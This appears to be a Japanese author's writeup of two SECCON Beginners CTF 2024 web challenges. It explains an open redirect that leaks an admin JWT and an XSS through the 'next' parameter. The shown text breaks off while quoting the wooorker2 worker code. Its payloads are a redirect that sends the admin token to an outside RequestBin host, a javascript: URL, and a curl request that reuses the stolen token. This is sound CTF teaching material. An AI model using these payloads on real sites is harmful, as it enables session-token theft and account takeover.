<!doctype html><html><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>SECCON Beginners CTF 2024 [Web] wooorker, wooorker2 作問者writeup - yuasa's blog</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="SECCON Beginners CTF 2024で出題したWeb問題wooorker、wooorker2の作問者writeupです。
wooorker（難易度 beginner） フロントエンド側のOpen Redirect脆弱性を悪用する問題です。
バックエンド側のapp/server.jsではログイン時にJWTを発行します。JWTはJSON形式でデータを持つことができ、改ざんの有無が検証できる文字列です。詳細はこちらのスライド資料をご参照ください。
ユーザーはguestとadminが存在しており、guestがログインした際にはisAdminがfalseのJWTが発行され、adminがログインした際にはisAdminがtrueのJWTが発行されます。
const users = { admin: { password: ADMIN_PASSWORD, isAdmin: true }, guest: { password: 'guest', isAdmin: false } }; ... app.post('/login', (req, res) => { const { username, password } = req.body; const user = users[username]; if (user && user.password === password) { const token = jwt.sign({ username, isAdmin: user.isAdmin }, jwtSecret, { expiresIn: '1h' }); res.status(200).json({ token }); } else { res."><meta property="og:image" content><meta property="og:title" content="SECCON Beginners CTF 2024 [Web] wooorker, wooorker2 作問者writeup"><meta property="og:description" content="SECCON Beginners CTF 2024で出題したWeb問題wooorker、wooorker2の作問者writeupです。
wooorker（難易度 beginner） フロントエンド側のOpen Redirect脆弱性を悪用する問題です。
バックエンド側のapp/server.jsではログイン時にJWTを発行します。JWTはJSON形式でデータを持つことができ、改ざんの有無が検証できる文字列です。詳細はこちらのスライド資料をご参照ください。
ユーザーはguestとadminが存在しており、guestがログインした際にはisAdminがfalseのJWTが発行され、adminがログインした際にはisAdminがtrueのJWTが発行されます。
const users = { admin: { password: ADMIN_PASSWORD, isAdmin: true }, guest: { password: 'guest', isAdmin: false } }; ... app.post('/login', (req, res) => { const { username, password } = req.body; const user = users[username]; if (user && user.password === password) { const token = jwt.sign({ username, isAdmin: user.isAdmin }, jwtSecret, { expiresIn: '1h' }); res.status(200).json({ token }); } else { res."><meta property="og:type" content="article"><meta property="og:url" content="/posts/44/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-06-16T14:01:00+09:00"><meta property="article:modified_time" content="2024-06-16T14:01:00+09:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="SECCON Beginners CTF 2024 [Web] wooorker, wooorker2 作問者writeup"><meta name=twitter:description content="SECCON Beginners CTF 2024で出題したWeb問題wooorker、wooorker2の作問者writeupです。
wooorker（難易度 beginner） フロントエンド側のOpen Redirect脆弱性を悪用する問題です。
バックエンド側のapp/server.jsではログイン時にJWTを発行します。JWTはJSON形式でデータを持つことができ、改ざんの有無が検証できる文字列です。詳細はこちらのスライド資料をご参照ください。
ユーザーはguestとadminが存在しており、guestがログインした際にはisAdminがfalseのJWTが発行され、adminがログインした際にはisAdminがtrueのJWTが発行されます。
const users = { admin: { password: ADMIN_PASSWORD, isAdmin: true }, guest: { password: 'guest', isAdmin: false } }; ... app.post('/login', (req, res) => { const { username, password } = req.body; const user = users[username]; if (user && user.password === password) { const token = jwt.sign({ username, isAdmin: user.isAdmin }, jwtSecret, { expiresIn: '1h' }); res.status(200).json({ token }); } else { res."><script src=/js/feather.min.js></script>
<link href=/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=/css/main.ac08a4c9714baa859217f92f051deb58df2938ec352b506df655005dcaf98cc0.css><link id=darkModeStyle rel=stylesheet type=text/css href=/css/dark.726cd11ca6eb7c4f7d48eb420354f814e5c1b94281aaf8fd0511c1319f7f78a4.css media="(prefers-color-scheme: dark)"><link rel=icon type=image/png href=/images/favicon.ico></head><body><div class=content><header><div class=main><a href=/>yuasa's blog</a></div><nav><a href=/>Home</a>
<a href=/posts>Posts</a>
<a href=/tags>Tags</a></nav></header><main><article><div class=title><h1 class=title>SECCON Beginners CTF 2024 [Web] wooorker, wooorker2 作問者writeup</h1><div class=meta>Posted on Jun 16, 2024</div></div><nav id=TableOfContents><ol><li><a href=#wooorker難易度-beginner>wooorker（難易度 beginner）</a></li><li><a href=#wooorker2難易度-medium>wooorker2（難易度 medium）</a></li><li><a href=#おわりに>おわりに</a></li></ol></nav><section class=body><p>SECCON Beginners CTF 2024で出題したWeb問題wooorker、wooorker2の作問者writeupです。</p><h1 id=wooorker難易度-beginner>wooorker（難易度 beginner）</h1><p>フロントエンド側のOpen Redirect脆弱性を悪用する問題です。</p><p>バックエンド側の<code>app/server.js</code>ではログイン時にJWTを発行します。JWTはJSON形式でデータを持つことができ、改ざんの有無が検証できる文字列です。詳細はこちらの<a href="https://speakerdeck.com/melonattacker/jwtsekiyuriteiru-men?slide=6">スライド資料</a>をご参照ください。</p><p>ユーザーは<code>guest</code>と<code>admin</code>が存在しており、<code>guest</code>がログインした際には<code>isAdmin</code>が<code>false</code>のJWTが発行され、<code>admin</code>がログインした際には<code>isAdmin</code>が<code>true</code>のJWTが発行されます。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>users</span> <span style=color:#f92672>=</span> {
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>admin</span><span style=color:#f92672>:</span> { <span style=color:#a6e22e>password</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>ADMIN_PASSWORD</span>, <span style=color:#a6e22e>isAdmin</span><span style=color:#f92672>:</span> <span style=color:#66d9ef>true</span> },
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>guest</span><span style=color:#f92672>:</span> { <span style=color:#a6e22e>password</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;guest&#39;</span>, <span style=color:#a6e22e>isAdmin</span><span style=color:#f92672>:</span> <span style=color:#66d9ef>false</span> }
</span></span><span style=display:flex><span>};
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>post</span>(<span style=color:#e6db74>&#39;/login&#39;</span>, (<span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>res</span>) =&gt; {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>const</span> { <span style=color:#a6e22e>username</span>, <span style=color:#a6e22e>password</span> } <span style=color:#f92672>=</span> <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>body</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>user</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>users</span>[<span style=color:#a6e22e>username</span>];
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>user</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>user</span>.<span style=color:#a6e22e>password</span> <span style=color:#f92672>===</span> <span style=color:#a6e22e>password</span>) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>token</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>jwt</span>.<span style=color:#a6e22e>sign</span>({ <span style=color:#a6e22e>username</span>, <span style=color:#a6e22e>isAdmin</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>user</span>.<span style=color:#a6e22e>isAdmin</span> }, <span style=color:#a6e22e>jwtSecret</span>, { <span style=color:#a6e22e>expiresIn</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;1h&#39;</span> });
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>200</span>).<span style=color:#a6e22e>json</span>({ <span style=color:#a6e22e>token</span> });
</span></span><span style=display:flex><span>  } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>401</span>).<span style=color:#a6e22e>json</span>({ <span style=color:#a6e22e>error</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;Unauthorized&#39;</span> });
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>});
</span></span></code></pre></div><p>また、flagを取得するエンドポイントでは送信されたJWTを検証し、<code>isAdmin</code>が<code>true</code>の場合のみflagを返します。</p><p>また、JWTの検証部分では検証に用いるアルゴリズムが特に指定されていませんが、<code>jsonwebtoken</code>ライブラリの最新版である<code>9.0.2</code>を用いています。試してみるとわかりますが、このバージョンでは<code>alg: none</code>攻撃や、RS256 の公開鍵を HS256 の共通鍵として使用する攻撃（<a href=https://scgajge12.hatenablog.com/entry/jwt_security>参考</a>）はブロックされるため、JWTを改ざんする方向性ではなさそうです。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#39;/flag&#39;</span>, (<span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>res</span>) =&gt; {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>token</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>headers</span>.<span style=color:#a6e22e>authorization</span><span style=color:#f92672>?</span>.<span style=color:#a6e22e>split</span>(<span style=color:#e6db74>&#39; &#39;</span>)[<span style=color:#ae81ff>1</span>];
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>token</span>) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>401</span>).<span style=color:#a6e22e>json</span>({ <span style=color:#a6e22e>error</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;No token provided&#39;</span> });
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>decoded</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>jwt</span>.<span style=color:#a6e22e>verify</span>(<span style=color:#a6e22e>token</span>, <span style=color:#a6e22e>jwtSecret</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>decoded</span>.<span style=color:#a6e22e>isAdmin</span>) {
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>flag</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>FLAG</span>;
</span></span><span style=display:flex><span>      <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>200</span>).<span style=color:#a6e22e>json</span>({ <span style=color:#a6e22e>flag</span> });
</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>      <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>403</span>).<span style=color:#a6e22e>json</span>({ <span style=color:#a6e22e>error</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;Access denied&#39;</span> });
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>  } <span style=color:#66d9ef>catch</span> (<span style=color:#a6e22e>error</span>) {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>401</span>).<span style=color:#a6e22e>json</span>({ <span style=color:#a6e22e>error</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;Invalid token&#39;</span> });
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>});
</span></span></code></pre></div><p>フロントエンド側の<code>app/public/main.js</code>では<code>login</code>関数を介してログイン処理を行い、JWTを取得します。また、クエリパタメータに<code>next</code>が含まれており、かつ値に<code>token=</code>が含まれない場合には<code>next</code>に指定したURLにクエリパラメータ<code>token</code>としてJWTを含んだ状態でリダイレクトを行います。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>loginWorker</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Worker</span>(<span style=color:#e6db74>&#39;login.js&#39;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>login</span>() {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>username</span> <span style=color:#f92672>=</span> document.<span style=color:#a6e22e>getElementById</span>(<span style=color:#e6db74>&#39;username&#39;</span>).<span style=color:#a6e22e>value</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>password</span> <span style=color:#f92672>=</span> document.<span style=color:#a6e22e>getElementById</span>(<span style=color:#e6db74>&#39;password&#39;</span>).<span style=color:#a6e22e>value</span>;
</span></span><span style=display:flex><span>    document.<span style=color:#a6e22e>getElementById</span>(<span style=color:#e6db74>&#39;username&#39;</span>).<span style=color:#a6e22e>value</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>;
</span></span><span style=display:flex><span>    document.<span style=color:#a6e22e>getElementById</span>(<span style=color:#e6db74>&#39;password&#39;</span>).<span style=color:#a6e22e>value</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>;
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>loginWorker</span>.<span style=color:#a6e22e>postMessage</span>({ <span style=color:#a6e22e>username</span>, <span style=color:#a6e22e>password</span> });
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>loginWorker</span>.<span style=color:#a6e22e>onmessage</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>function</span>(<span style=color:#a6e22e>event</span>) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> { <span style=color:#a6e22e>token</span>, <span style=color:#a6e22e>error</span> } <span style=color:#f92672>=</span> <span style=color:#a6e22e>event</span>.<span style=color:#a6e22e>data</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>error</span>) {
</span></span><span style=display:flex><span>        document.<span style=color:#a6e22e>getElementById</span>(<span style=color:#e6db74>&#39;errorContainer&#39;</span>).<span style=color:#a6e22e>innerText</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>error</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>token</span>) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>params</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>URLSearchParams</span>(window.<span style=color:#a6e22e>location</span>.<span style=color:#a6e22e>search</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>next</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>params</span>.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#39;next&#39;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>next</span>) {
</span></span><span style=display:flex><span>            window.<span style=color:#a6e22e>location</span>.<span style=color:#a6e22e>href</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>next</span>.<span style=color:#a6e22e>includes</span>(<span style=color:#e6db74>&#39;token=&#39;</span>) <span style=color:#f92672>?</span> <span style=color:#a6e22e>next</span><span style=color:#f92672>:</span> <span style=color:#e6db74>`</span><span style=color:#e6db74>${</span><span style=color:#a6e22e>next</span><span style=color:#e6db74>}</span><span style=color:#e6db74>?token=</span><span style=color:#e6db74>${</span><span style=color:#a6e22e>token</span><span style=color:#e6db74>}</span><span style=color:#e6db74>`</span>;
</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>            window.<span style=color:#a6e22e>location</span>.<span style=color:#a6e22e>href</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>`/?token=</span><span style=color:#e6db74>${</span><span style=color:#a6e22e>token</span><span style=color:#e6db74>}</span><span style=color:#e6db74>`</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>};
</span></span></code></pre></div><p>また、今回の問題ではクローラーが存在しており、クローラーは<code>https://wooorker.beginners.seccon.games/report</code>から操作することができます。</p><p>クローラーは<code>login?next=/</code>を送信すると、<code>https://wooorker.quals.beginners.seccon.jp/login?next=/</code>を踏んで<code>admin</code>としてログインする仕様となっていいます。そのため、<code>login?next=[リクエストを受信するサーバ]</code>を送信することで<code>admin</code>のJWTがクエリパラメータ<code>token</code>に付与された状態でリダイレクトがなされます。</p><p>リクエストを受信するサーバとしては<a href=https://pipedream.com/requestbin>Request Bin</a>などのサービスを利用することができます。</p><p>Request Binを利用する場合は、<code>login?next=https://[yours].m.pipedream.net</code>をクローラーに送信することで、<code>admin</code>のJWTが得られます。</p><p><img src=/images/posts/44/report.png alt=report></p><p>Request Binに送信されたリクエストにはクエリパラメータにJWTが含まれています。</p><p><img src=/images/posts/44/token.png alt=token></p><p>実際に<a href=https://jwt.io/>jwt.io</a>などでJWTをデコードすると、<code>isAdmin</code>が<code>true</code>になっていることが確認できます。</p><p><img src=/images/posts/44/decode.png alt=decode></p><p>そして取得したJWTを用いて、<code>https://wooorker.beginners.seccon.games/?token=[取得したJWT]</code>にアクセスするとflagが得られます。</p><p><img src=/images/posts/44/flag1.png alt=flag1></p><p>直接<code>/flag</code>エンドポイントからflagを得る場合は、以下のようにして取得できます。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>curl -H <span style=color:#e6db74>&#34;Authorization: Bearer [取得したJWT]&#34;</span> https://wooorker.beginners.seccon.games/flag   
</span></span><span style=display:flex><span><span style=color:#f92672>{</span><span style=color:#e6db74>&#34;flag&#34;</span>:<span style=color:#e6db74>&#34;ctf4b{0p3n_r3d1r3c7_m4k35_70k3n_l34k3d}&#34;</span><span style=color:#f92672>}</span>% 
</span></span></code></pre></div><h1 id=wooorker2難易度-medium>wooorker2（難易度 medium）</h1><p>wooorker2もwooorkerとほとんど同じソースコードが与えられますが、wooorkerとの違いとして、リダイレクト時にJWTがクエリパラメータではなくハッシュで渡される点があります。</p><p>以下はwooorker、wooorker2における<code>app/public/main.js</code>の差分です。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#ae81ff>22</span><span style=color:#a6e22e>c22</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;</span>             window.<span style=color:#a6e22e>location</span>.<span style=color:#a6e22e>href</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>next</span>.<span style=color:#a6e22e>includes</span>(<span style=color:#e6db74>&#39;token=&#39;</span>) <span style=color:#f92672>?</span> <span style=color:#a6e22e>next</span><span style=color:#f92672>:</span> <span style=color:#e6db74>`</span><span style=color:#e6db74>${</span><span style=color:#a6e22e>next</span><span style=color:#e6db74>}</span><span style=color:#e6db74>?token=</span><span style=color:#e6db74>${</span><span style=color:#a6e22e>token</span><span style=color:#e6db74>}</span><span style=color:#e6db74>`</span>;
</span></span><span style=display:flex><span><span style=color:#f92672>---</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&gt;</span>             window.<span style=color:#a6e22e>location</span>.<span style=color:#a6e22e>href</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>next</span>.<span style=color:#a6e22e>includes</span>(<span style=color:#e6db74>&#39;token=&#39;</span>) <span style=color:#f92672>?</span> <span style=color:#a6e22e>next</span><span style=color:#f92672>:</span> <span style=color:#e6db74>`</span><span style=color:#e6db74>${</span><span style=color:#a6e22e>next</span><span style=color:#e6db74>}</span><span style=color:#e6db74>#token=</span><span style=color:#e6db74>${</span><span style=color:#a6e22e>token</span><span style=color:#e6db74>}</span><span style=color:#e6db74>`</span>;
</span></span><span style=display:flex><span><span style=color:#ae81ff>24</span><span style=color:#a6e22e>c24</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;</span>             window.<span style=color:#a6e22e>location</span>.<span style=color:#a6e22e>href</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>`/?token=</span><span style=color:#e6db74>${</span><span style=color:#a6e22e>token</span><span style=color:#e6db74>}</span><span style=color:#e6db74>`</span>;
</span></span><span style=display:flex><span><span style=color:#f92672>---</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&gt;</span>             window.<span style=color:#a6e22e>location</span>.<span style=color:#a6e22e>href</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>`/#token=</span><span style=color:#e6db74>${</span><span style=color:#a6e22e>token</span><span style=color:#e6db74>}</span><span style=color:#e6db74>`</span>;
</span></span></code></pre></div><p>ハッシュで指定したパラメータはクエリパラメータとは異なり、バックエンド側に送信されません。そのため、クローラーに<code>login?next=[リクエストを受信するサーバ]</code>を送信しても<code>admin</code>のJWTを受け取ることはできません。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>next</span>) {
</span></span><span style=display:flex><span>    window.<span style=color:#a6e22e>location</span>.<span style=color:#a6e22e>href</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>next</span>.<span style=color:#a6e22e>includes</span>(<span style=color:#e6db74>&#39;token=&#39;</span>) <span style=color:#f92672>?</span> <span style=color:#a6e22e>next</span><span style=color:#f92672>:</span> <span style=color:#e6db74>`</span><span style=color:#e6db74>${</span><span style=color:#a6e22e>next</span><span style=color:#e6db74>}</span><span style=color:#e6db74>#token=</span><span style=color:#e6db74>${</span><span style=color:#a6e22e>token</span><span style=color:#e6db74>}</span><span style=color:#e6db74>`</span>;
</span></span><span style=display:flex><span>} <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>    window.<span style=color:#a6e22e>location</span>.<span style=color:#a6e22e>href</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>`/#token=</span><span style=color:#e6db74>${</span><span style=color:#a6e22e>token</span><span style=color:#e6db74>}</span><span style=color:#e6db74>`</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>wooorkerの解説では触れていませんでしたが、クエリパラメータ<code>next</code>がそのまま<code>location.href</code>に渡されているため、<code>next</code>に<code>javascript:alert(1)</code>などを渡すことで、XSSによるJavaScriptの実行は可能です。</p><p>そこで、JavaScriptによって<code>admin</code>のパスワードを直接DOM要素から取得することを試みますが、フォームの入力は削除されるため取得することはできません。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>login</span>() {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>username</span> <span style=color:#f92672>=</span> document.<span style=color:#a6e22e>getElementById</span>(<span style=color:#e6db74>&#39;username&#39;</span>).<span style=color:#a6e22e>value</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>password</span> <span style=color:#f92672>=</span> document.<span style=color:#a6e22e>getElementById</span>(<span style=color:#e6db74>&#39;password&#39;</span>).<span style=color:#a6e22e>value</span>;
</span></span><span style=display:flex><span>    document.<span style=color:#a6e22e>getElementById</span>(<span style=color:#e6db74>&#39;username&#39;</span>).<span style=color:#a6e22e>value</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>;
</span></span><span style=display:flex><span>    document.<span style=color:#a6e22e>getElementById</span>(<span style=color:#e6db74>&#39;password&#39;</span>).<span style=color:#a6e22e>value</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>;
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>loginWorker</span>.<span style=color:#a6e22e>postMessage</span>({ <span style=color:#a6e22e>username</span>, <span style=color:#a6e22e>password</span> });
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p><code>main.js</code>を改めて見直すとユーザー名とパスワードをバックエンドに送信し、JWTを受信する処理は<code>loginWorker</code>というWorker内で行われることがわかります。Workerはバックグラウンドでタスクを実行できるものであり、作成元にメッセージを送り返すことができます（<a href=https://developer.mozilla.org/ja/docs/Web/API/Worker>参考</a>）。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>loginWorker</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Worker</span>(<span style=color:#e6db74>&#39;login.js&#39;</span>);
</span></span></code></pre></div><p><code>login.js</code>は以下であり、受け取ったJWTを<code>main.js</code>に<a href=https://developer.mozilla.org/ja/docs/Web/API/Worker/postMessage>Worker.postMessage()</a>経由で送信します。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#66d9ef>let</span> <span style=color:#a6e22e>username</span>, <span style=color:#a6e22e>password</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>onmessage</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>async</span> <span style=color:#66d9ef>function</span>(<span style=color:#a6e22e>event</span>) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(<span style=color:#f92672>!</span><span style=color:#a6e22e>username</span>) <span style=color:#a6e22e>username</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>event</span>.<span style=color:#a6e22e>data</span>.<span style=color:#a6e22e>username</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(<span style=color:#f92672>!</span><span style=color:#a6e22e>password</span>) <span style=color:#a6e22e>password</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>event</span>.<span style=color:#a6e22e>data</span>.<span style=color:#a6e22e>password</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>response</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>fetch</span>(<span style=color:#e6db74>&#39;/login&#39;</span>, {
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>method</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;POST&#39;</span>,
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>headers</span><span style=color:#f92672>:</span> {
</span></span><span style=display:flex><span>                <span style=color:#e6db74>&#39;Content-Type&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;application/json&#39;</span>
</span></span><span style=display:flex><span>            },
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>body</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>JSON</span>.<span style=color:#a6e22e>stringify</span>({ <span style=color:#a6e22e>username</span>, <span style=color:#a6e22e>password</span> })
</span></span><span style=display:flex><span>        });
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>result</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>response</span>.<span style=color:#a6e22e>json</span>();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>response</span>.<span style=color:#a6e22e>ok</span>) {
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>postMessage</span>({ <span style=color:#a6e22e>token</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>result</span>.<span style=color:#a6e22e>token</span> });
</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>postMessage</span>({ <span style=color:#a6e22e>token</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;&#39;</span>, <span style=color:#a6e22e>error</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>result</span>.<span style=color:#a6e22e>error</span> });
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>catch</span> (<span style=color:#a6e22e>error</span>) {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>postMessage</span>({ <span style=color:#a6e22e>token</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;&#39;</span>, <span style=color:#a6e22e>error</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;Error logging in.&#39;</span> });
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>};
